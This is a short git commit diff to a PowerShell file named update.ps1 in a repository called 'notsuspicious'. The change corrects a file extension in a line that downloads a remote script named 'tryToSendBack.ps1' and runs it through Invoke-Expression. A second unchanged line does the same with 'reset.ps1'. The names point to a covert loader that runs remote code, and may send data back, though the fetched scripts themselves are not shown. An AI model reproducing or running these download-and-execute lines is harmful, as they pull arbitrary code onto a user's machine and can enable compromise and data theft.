7b4fb75f291769be84554d31788b4aacd2b6550b
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-03-01 14:22:49 +0100

    Update update.ps1

--- update.ps1
+++ update.ps1
@@ -1,2 +1,2 @@
-Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/tryToSendBack.ps1.bat" -UseBasicParsing).Content
+Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/tryToSendBack.ps1" -UseBasicParsing).Content
 Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/reset.ps1" -UseBasicParsing).Content
